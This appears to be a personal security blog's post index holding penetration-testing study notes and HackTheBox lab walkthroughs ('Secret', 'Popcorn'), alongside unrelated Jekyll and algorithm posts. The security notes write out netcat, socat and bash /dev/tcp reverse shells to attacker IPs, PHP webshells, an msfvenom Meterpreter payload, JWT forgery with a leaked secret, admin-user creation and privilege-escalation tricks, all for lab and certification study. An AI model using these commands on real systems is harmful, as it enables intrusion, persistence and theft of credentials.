in URL “10.10.84.199/uploads/shell.php?cmd=ifconfig”  run ifconfig on server.pentestmonkey reverse shell  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php  a full reverse shell written in PHPNextTry to get access to user account  SSH keys stored at /home/&lt;user&gt;/.ssh  Windows eg, VNC servers frequently leave passwords in the registry stored in plaintext.  FileZilla FTP server also leave credentials in an XML filewindos add user:  net user &lt;username&gt; &lt;password&gt; /add  net localgroup administrators &lt;username&gt; /addpracticep1  nc -lnvp 4444 on attacker.  NC &lt;yourmachineip&gt; -e /bin.bash on target.  python3 -c 'import pty;pty.spawn(\"/bin/bash\")' on attacker, stabilizep2  /usr/share/webshells/php/php-reverse-shell.php change the IP to attacker`s.  nc -lnvp 1234 on attacker.  upload php-reverse-shell.php to server and run it.p3(nc REVERSE SHELL)  nc -lvnp 4444 attacker’s  nc &lt;tun0-ip&gt; 4444-e /bin/bash target’sp3(nc BIND SHELL)  nc  -lvnp 4444-e /bin/bash target’s terminal  nc &lt;target-ip&gt; 4444 attacker’s terminalp4(socat reverse shell linux)  socat TCP-L:4444 - attacker`s  socat TCP:&lt;tun0-ip&gt;:4444 EXEC:\"bash -li\" target`sp4(socat bind shell linux)  socat TCP-L:4444 EXEC:\"bash -li\" target`s  socat TCP:&lt;ip&gt;:4444 - attacker`sP5 other reverse shell techniques  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.mdp6  can not submit linux reverse shell to windowsp7 windows php reverse shell   &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;P8 Windows net command.  The “Net Accounts” command is used to set the policy settings on local computer, such as Account policies and password policies. This command can’t be used on domain controller. This command is only used on local computer.  add a user and add to administrators group.  net user USERNAME PASSWORD /ad  net localgroup administrators USERNAME /addp9 (nc reverse shell windows)  nc -lvnp 4444 attacker`s  nc &lt;tun0-ip&gt; 4444 -e \"cmd.exe\" target`sp9 (nc bind shell windows)  nc -lvnp 3333 -e \"cmd.exe\" target`s  nc &lt;target-ip&gt;  3333 attacker`sp9 (socat reverse shell windows)  socat TCP-L:8888 - attacker`s  socat TCP:&lt;tun0-ip&gt;:8888 EXEC:powershell.exe,pipes target`sp9 (socat bind shell windows)  socat TCP-L:4444EXEC:powershell.exe,pipes target`s  socat TCP:&lt;target-ip&gt;:4444- attacker`sp10 Create a 64bit Windows Meterpreter shell using msfvenom  create shell  msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=&lt;tun0-ip&gt; LPORT=4444  start a listenermsfconsoleuse multi/handlerset LHOST=&lt;tun0-ip&gt; ,set LPORT=4444set payload windows/x64/meterpreter/reverse_tcprun Linux PrivEscEnumeration  $ hostname hostname  $ uname -a  $ cat /proc/version kernel version  $ cat /etc/os-release system version  $ cat /etc/issue system version  ps -A  View all running processes  ps axjf View process tree  ps aux show processes for all users (a), display the user that launched the process (u),  processes that are not attached to a terminal (x)  netstat -a shows all listening ports and established connections.  netstat -at or netstat -au, show tcp or udp  netstat -l list ports in “listening” mode  find . -name flag1.txt find file in current directory  find /home -name flag1.txt find file in home directory  ind / -type d -name config find directory in /  find / -type f -perm 0777 find file with permission 777  find / -perm a=x find executable files  find /home -user frank  find / -mtime 10 find files modified in last 10 days.  find / -atime 10 find files access in last 10 days.  find / -cmin -60 find files changed in last 60 minutes.  find / -size 50M find files with size of 50m.  find / -size +100M find files larger than 100m.  find / -size +100M -type f 2&gt;/dev/null redirect errors to “/dev/null” and have a cleaner outputAutomated Enumeration Tools  LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  LinEnum: https://github.com/rebootuser/LinEnum  LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester  Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration  Linux Priv Checker: https://github.com/linted/linuxprivcheckersudo  https://gtfobins.github.io/  find what we can do of a sudo programLeverage LD_PRELOAD  use LD_PRELOAD to cheat. https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/  random_num.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt; int main(){  srand(time(NULL));  int i = 10;  while(i--) printf(\"%d\\n\",rand()%100);  return 0;}  gcc random_num.c -o random_num  unrandom.cint rand(){    return 42; //the most random number in the universe}  gcc -shared -fPIC unrandom.c -o unrandom.so  LD_PRELOAD=$PWD/unrandom.so ./random_nums not random, but random when ./random_nums  export LD_PRELOAD=$PWD/unrandom.so set to env, and, not random even ./ random_nums  printenv LD_PRELOAD Check environment value  ldd random_nums Check program shared objectssuid  SUID (Set-user Identification) and SGID (Set-group Identification)  allow files to be executed with the permission level of the file owner or the group owner  find / -type f -perm -04000 -ls 2&gt;/dev/null  unshadow shadow.txt passwd.txt &gt; secret.txt  john --wordlist=/usr/share/wordlists/rockyou.txt secret.txtCapabilities  https://man7.org/linux/man-pages/man7/capabilities.7.html  getcap -r / 2&gt;/dev/nullcron jobs  cat /etc/crontabPATH  echo $PATH  find / -writable 2&gt;/dev/null find writable folders  find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u  grep -v invert-match, select the non-matching lines. do not show “/proc/{ID}” lines.  export PATH=/tmp:$PATH  when a root program “test” with “SUID” bit set, and it calls system(\"thm\"), we need to add executable “thm” to $PATH. And it can run as root after “test” executed.NFS  Network File Sharing.  SSH, Telnet.  cat /etc/exports configurations  The critical element for this privilege escalation vector is the “no_root_squash” option.  showmount -e {targetIP} on attackers`, to check the target opened path  mkdir {attacker_path}  mount -o rw {targetIP}:/{showed open path} {attacker_path}Windows Privescautomated enumeration script  winPEAS or PowerUp.ps1Manual checklist  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.mdVulnerable machine  https://github.com/sagishahar/lpeworkshopcommand:  whoami /priv Current user’s privileges  net users list users  net user {username} detail of a user  net localgroup User groups defined on the system  net localgroup {groupname} list members of a group  systeminfo show system information  systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" grep the outputsearch file:  findstr /si password *.txt  /si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)list updates installed on the target system:  wmic qfe get Caption,Description,HotFixID,InstalledOn  Windows Management Instrumentation (WMI)Network Connections: netstat -anoScheduled Tasks:schtasks, schtasks /query /fo LIST /vDrivers: driverqueryAntivirus: sc query windefend, sc queryex type=serviceTools:  WinPEAS winpeas.exe &gt; outputfile.txt https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  PowerUp https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  Windows Exploit Suggester. https://github.com/AonCyberLabs/Windows-Exploit-Suggesterwmic product get name,version,vendorDLL Hijacking  DLL search order  https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order  Process Monitor (ProcMon)Creating the malicious DLL file"
  },
  
  {
    "title": "htb secret",
    "url": "/posts/htb-secret/",
    "categories": "sec",
    "tags": "htb",
    "date": "2021-10-30 08:00:00 +0800",
    





    "snippet": "nmapnmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120See 80, 3000 port run the same thing:  maybe 80 is a reverse proxy of 3000.  maybe one developer version, one production version.  some misconfigurationDirectory discoveryferoxbuster -u http://10.10.11.120use API by document# /api/user/registercurl -d '{\"name\":\"0xdf0xdf\",\"email\":\"dfdfdfdf@secret.com\",\"password\":\"password\"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'# /api/user/logincurl -d '{\"email\":\"dfdfdfdf@secret.com\",\"password\":\"password\"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: Application/json'  -d data  -X method  -H header  It supports these protocols: DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP,  LDAPS,  MQTT,  POP3,  POP3S, RTMP,  RTMPS,  RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP.  after the request, got a JWT.nginx  port 80 is same with port 3000. 3000 does not have NGINX.  suspect NGINX is just there to proxy for Express.analysis the source  nodejs express applicationfind Token generation// Dotenv loads environment variables from a .env file into process.envconst dotenv = require('dotenv')dotenv.config();// create jwtconst jwt = require(\"jsonwebtoken\");const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )res.header('auth-token', token).send(token);const verified = jwt.verify(token, process.env.TOKEN_SECRET);find git informationgit log --onelinegit show 67d8da7get the TOKEN_SECRET from git old versionfind some api need “admin”`s token  like /api/priv and /api/logsForge JWThttps://jwt.io/decodepip3 install pyjwtimport jwttoken='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'secret='gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'# decodejwt.decode(token, secret, algorithms=[\"HS256\"])# result-&gt; {'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}Create Tokenj = jwt.decode(token, secret, algorithms=[\"HS256\"])j['name'] = 'theadmin'jwt.encode(j, secret, algorithm=\"HS256\")# result-&gt; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8try to usecurl -s 'http://10.10.11.120/api/priv' -H \"auth-token: {token}\" | jq .Command Injectionif (name == 'theadmin'){    const getLogs = `git log --oneline ${file}`;    exec(getLogs, (err , output) =&gt;{try to manituplate to -&gt; git log --oneline; [any command]curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.6' -H \"auth-token: {token}\" | jq -r .attacker machine -&gt; sudo tcpdump -ni tun0 icmpForce to use G (Get) method.  -d,  –data,  –data-binary  or –data-urlencode to be used in an HTTP GET request instead of the POST request.    curl -s -G 'http://10.10.11.120/api/logs' \\--data-urlencode 'file=/dev/null;id' \\-H \"auth-token: {token}\" \\| jq -r .      reverse shellcurl -s -G 'http://10.10.11.120/api/logs' \\--data-urlencode \"file=&gt;/dev/null;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'\" \\-H \"auth-token: {token}\" \\| jq -r .attackers machine:  nc -lnvp 443`privescget information from coredump.an suid programfilecount(path, summary);// source code of \"count\" program// drop privs to limit file writesetuid(getuid());// Enable coredump generationprctl(PR_SET_DUMPABLE, 1);printf(\"Save results a file? [y/N]: \");res = getchar();   ps auxww | grep count find pid of the program  background the program at getchar()  find file handler in /proc/[pid]/fd  find “/root/.viminfo” as input file path can be readable  as we can not access “/root”, we can not cat /root/.viminfo  but we can read .viminfo from file handler  We can get the SSH key from it.another way, from Crash Dump  Because Enabled coredump generation  When a program crashes, the system stores the crash dump files in /var/crash  input /root/.ssh/id_rsa as path input   kill -l list kill signals   kill -SIGSEGV {pid} send a segmentation fault  /var/crash$ apport-unpack _opt_count.1000.crash /tmp/0xdf decompress the dump into a given directory  strings -n 30 CoreDump  then get the SSH key from it."
  },
  
  {
    "title": "Pentest+ notes",
    "url": "/posts/pentestPlus/",
    "categories": "sec",
    "tags": "pentest+",
    "date": "2021-05-18 11:33:00 +0800",
    





    "snippet": "Tools:cheetsheethttps://highon.coffee/blog/penetration-testing-tools-cheat-sheetScanners  Nikto  OpenVAS  sqlmap  Nessus  NmapOSINT  WHOIS  Nslookup  FOCA  theHarvester  Shodan  Maltego  Recon-ng  CensysRemote Access Tools  Secure Shell (SSH)  Ncat  NeTCAT  ProxychainsCredential Testing Tools  Hashcat  Medusa  Hydra  CeWL  John the Ripper  Cain and Abel  Mimikatz  Patator  DirBuster  W3AFWireless  Aircrack-ng  Kismet  WiFiteNetworking Tools  Wireshark  HpingDebuggers  OllyDbgTools of the Trade 19  Immunity Debugger  GDB  WinDbg  IDAWeb Proxies  OWASP ZAP  Burp SuiteMobile Tools  Drozer  APKX  APK StudioSoftware Assurance  FindBugs/find-sec-bugs  Peach  AFL  SonarQube  YASCASocial Engineering Tools  SeT  BeeFMiscellaneous Tools  SearchSploit  PowerSploit  Responder  Impacket  empire  Metasploit frameworkfour phases:  Planning and Scoping  Information Gathering and Vulnerability Identification  Attacking and Exploiting  Reporting and Communicating ResultsPenetration Testing Execution Standard:  http://www.pentest-standard.org/index.php/Main_Pagerules of engagement (RoE)  timeline  locations, systems, applications, or other potential targets  Data handling requirements  target behaviors  resources are committed to the test  Legal concerns  communications  particular events  Who is permitted to engageapi documents:  XML: Web Services Description Language (WSDL)  Web Application Description Language (WADL)  SOAP  reference: Swagger, a suite of API developer tools. https://petstore.swagger.iolegal:  SOW: statement of work. define project-specific activities, deliverables, and timelines  SOOs: statements of objectives  PWSs: performance work statements  MSA: master services agreement. The terms that will govern future agreements.  NDAs: nondisclosure agreements  CAs: confidentiality agreementscompliance:  HIPAA, FERPA, SOX, GLBA, and PCI DSS  PCI DSS, guide line: https://www.pcisecuritystandards.org/documents/Penetration_Testing_Guidance_March_2015.pdf  https://www.pcisecuritystandards.org/  GLBA: requires fi nancial institutions to protect against “reasonably anticipated threats”  HIPAA: forbid protected health information (PHI) from being accessedproper signing authority  ISO(information security officer) or the sponsor may be it.Disclaimers  Point-in-time assessment  ComprehensivenessNAC  NETWORK ACCESS CONTROLScope creep  additional items are added to the scope of an assessmentCertificate pinning  associates a host with an X.509 certificate (or a public key) and then uses that association to make a trust decision.  pinning list, called a pinset.CERT  Computer Emergency Response Team      , &lt;https://www.us-cert.gov&gt;, &lt;https://www.sei.cmu.edu/our-work/cybersecurity-center-development/national-csirts/index.cfm&gt;  MITRE  CAPEC: The Common Attack Pattern Enumeration and Classification. https://capec.mitre.org  CVE: Common Vulnerabilities and Exposures. https://www.cve.mitre.org  CWE: Common Weakness Enumeration. &lt; https://cwe.mitre.org&gt;ISC  SANS. https://pen-testing.sans.org/blog/pen-testingmetadata scanning tools  ExifTool  FOCA, Fingerprinting Organizations with Collected ArchivesDNShistorical view of the domain registration information  domainhistory.net  whoismind.comhost google.comzone transfer  host -t axfr domain.name dns-server  dig axfr @target.nameserver.com domain.name  nmap –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain&lt;domain&gt; -p53 &lt;hosts&gt;Routes  traceroute (or tracert on Windows): tracert www.netflix.com  tracert * * * : No response to query(maybe timeout) but traffic is going through. hosts not respond but route traffic properly.  BGP looking glasses: http://www.bgp4.as/looking-glasses, allow for route inspection.DatatheHarvester  gather emails, domain information, hostnames, employee names, and open ports and banners  using search engines and MaltegoRecon-ng  OSINTcommon ports  20 TCP, UDP FTP data  21 TCP, UDP FTP control  22 TCP, UDP SSH  23 TCP, UDP Telnet  25 TCP, UDP SMTP (email)  53 UDP DNS  67 TCP, UDP DHCP server  68 TCP, UDP DHCP client  69 TCP, UDP TFTP  80 TCP, UDP HTTP  88 TCP, UDP Kerberos  110 TCP, UDP POP3  123 TCP, UDP NTP  135 TCP, UDP Microsoft EPMAP  136-139 TCP, UDP NetBIOS  143 TCP IMAP  161 UDP SNMP  162 TCP, UDP SNMP traps  389 TCP, UDP LDAP  443 TCP, UDP HTTPS  445 TCP Microsoft AD and SMB  500 TCP, UDP ISAKMP, IKE  515 TCP LPD print services  1433 TCP Microsoft SQL Server  1434 TCP, UDP Microsoft SQL Monitor  1521 TCP Oracle database listener  1812, 1813 TCP, UDP RADIUSKismet additional features:  find hidden SSIDs  passive association of wireless clients and access points  tools help to decrypt encrypted trafficSNMP sweep  network topology map and device discovery  need correct community stringpacket crafting  Hping is popular. create custom packets easily.  sending SYN packets. hping -S -V targetsite.com -p 8080 verbose output  Scapy, Yersina, and even NETCAT.Enumerationusers: SMB, SNMP are most common. and email user enumeration.email: theHarvester, Metasploit  msf&gt; use auxiliary/gather/search_email_collector  purchase commercial email address listsgroup  snmp snmpwalk public -v1 10.0.0.1 1 | grep 77.1.2.25 | cut -d \"\" -f4  samrdump https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_15/examples/samrdump.py  Impacket Python libraries: SMB tools, NTLM and Kerberos authentication capabilities https://www.coresecurity.com/corelabs-research/open-source-tools/impacketexpired certificates  indicators of improper maintenanceport scan  Hping: hping example.com -V –scan 1-1024  NETCAT: nc -zv example.com 1-2014  Telnet: Telnet to each port, looking for a blank screenscanfirst test:  NDA: nondisclosure agreement  SOW: statement of work  MSA: master services agreement  An authenticated(credentialed) scan: provides the most detailed view of the system.  ln /dev/null ~/.bash_history -sf make bash history to null  Nmap will scan the 1,000 most common ports for both TCP and UDP, by default.  VLAN hopping: one technique: double tagging attack.  determine if in VM: Run wmic baseboard to get manufacturer, product"
  },
  
  {
    "title": "Algorithm",
    "url": "/posts/Algorithm/",
    "categories": "dev",
    "tags": "leetcode, java, python",
    "date": "2021-03-27 11:33:00 +0800",
    





    "snippet": "LinkJAVA HashMap    Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();    map.containskey(), map.get(),Python HashMap  https://docs.python.org/3/tutorial/datastructures.html#dictionaries"
  },
  
  {
    "title": "htb popcorn",
    "url": "/posts/htb-popcorn/",
    "categories": "sec",
    "tags": "htb, pam, dirtycow",
    "date": "2021-03-15 11:33:00 +0800",
    





    "snippet": "Reconnmapnmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6  OpenSSH 5.1p1, Apache httpd 2.2.12  —&gt; older than Ubuntu Trusty 14.04 —&gt; Karmic (9.10)Directory discovery# directory discovergobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root-med -t 40  get the path: /test (Status: 200) /index (Status: 200) /torrent (Status: 301) /rename (Status: 301)  show a PHP info page.  file_uploads is set to ON  may vulnerable to Local File Inclusion.(LFI)  /torrent can upload image as screen shot  and the picture is saved at http://10.10.10.6/torrent/upload/upload webshellmanipulate php to bypass picture filters            file extension (the server did not have check this)                  Content-Type header (this filter works on the server)                  magic bytes (did not work)      so just change the http header,add the php code before a png content in Burpsuite.&lt;?php system($_REQUEST[\"cmd\"]);?&gt;uploadcmd.php seems to be rename as its hash value, as 0ba973670d943861fb9453eecefd3bf7d3054713.php.executecurl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=idreverse shellwebshellcurl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1'\"attackernc -lnvp 443upgrade the shellpython -c 'import pty;pty.spawn(\"bash\")'^Zstty raw -echofgprivescMethod 1: Linux PAM vulnerabilityshow the programs use PAM$ ls /etc/pam.d chfn common-account common-session lightdm login passwd runuser sshd  su-l chpasswd  common-auth common-session-noninteractive lightdm-autologin newusers polkit-1 runuser-l suchsh common-password  cron lightdm-greeter other ppp samba sudoThe pam modules directory. Can be configured to the programs above/usr/lib/x86_64-linux-gnu/securityat users filefind . -type f -ls/.cache/motd.legal-displayed` looks interesting.  Googling for “motd.legal-displayed privesc”  https://www.exploit-db.com/exploits/14339  Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation  PAM will create .cache/motd.legal-displayed when login.  https://askubuntu.com/questions/256020/how-can-i-stop-the-automatic-creation-of-cache-motd-legal-displayed-file  sshd use pam to authenticate, so we need to ssh to the box.(as www-data)Method 2: Dirty Cow"
  },
  
  {
    "title": "Text and Typography",
    "url": "/posts/text-and-typography/",
    "categories": "dev",
    "tags": "jekyll, markdown",
    "date": "2019-08-08 11:33:00 +0800",
    





    "snippet": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let’s start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 - headingParagraphI wandered lonely as a cloudThat floats on high o’er vales and hills,When all at once I saw a crowd,A host, of golden daffodils;Beside the lake, beneath the trees,Fluttering and dancing in the breeze.ListsOrdered list  Firstly  Secondly  ThirdlyUnordered list  Chapter          Section                  Paragraph                    Task list  TODO  Completed  Defeat COVID-19          Vaccine production      Economic recovery      People smile again      Description list  Sun  the star around which the earth orbits  Moon  the natural satellite of the earth, visible by reflected light from the sunBlock Quote  This line shows the block quote.Prompts  An example showing the tip type prompt.  An example showing the info type prompt.  An example showing the warning type prompt.  An example showing the danger type prompt.Tables            Company      Contact      Country                  Alfreds Futterkiste      Maria Anders      Germany              Island Trading      Helen Bennett      UK              Magazzini Alimentari Riuniti      Giovanni Rovelli      Italy      Linkshttp://127.0.0.1:4000FootnoteClick the hook will locate the footnote1, and here is another footnote2.Images  Default (with caption)Full screen width and center alignment  Shadowshadow effect (visible in light mode)  Left aligned      Float to left    “A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space.”        Float to right    “A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space.”  Mermaid SVG gantt  title  Adding GANTT diagram functionality to mermaid  apple :a, 2017-07-20, 1w  banana :crit, b, 2017-07-23, 1d  cherry :active, c, after b a, 1dMathematicsThe mathematics powered by MathJax:\\[\\sum_{n=1}^\\infty 1/n^2 = \\frac{\\pi^2}{6}\\]When $a \\ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are\\[x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}\\]Inline codeThis is an example of Inline Code.FilepathHere is the /path/to/the/file.extend.Code blockCommonThis is a common code snippet, without syntax highlight and line number.Specific LanguagesConsole$ env |grep SHELLSHELL=/usr/local/bin/bashPYENV_SHELL=bashShellif [ $? -ne 0 ]; then    echo \"The command was not successful.\";    #do the needful / exitfi;Specific filename@import  \"colors/light-typography\",  \"colors/dark-typography\"Reverse Footnote            The footnote source &#8617;              The 2nd footnote source &#8617;      "
  },
  
  {
    "title": "How to write a post",
    "url": "/posts/Write-A-Post/",
    "categories": "dev",
    "tags": "jekyll, git",
    "date": "2018-03-02 11:33:00 +0800",
    





    "snippet": "How to write a postSteps:  Create post(s) with .md format at zenbro.github.io/_posts  Run the bash     #! /bin/bash     echo inputCommitMessage read commit     git clone https://github.com/YuchaoZheng88/zenbro.github.io.git cd zenbro.github.io git submodule init git submodule update cd YuchaoZheng88.github.io/ git checkout main cd .. bundle update jekyll build -d YuchaoZheng88.github.io cd YuchaoZheng88.github.io/     git add . git commit -m \"$commit\" git push cd .. git add . git commit -m \"$commit\" git push            push YuchaoZheng88.github.io, then push main zenbro.github.io"
  }
  
]

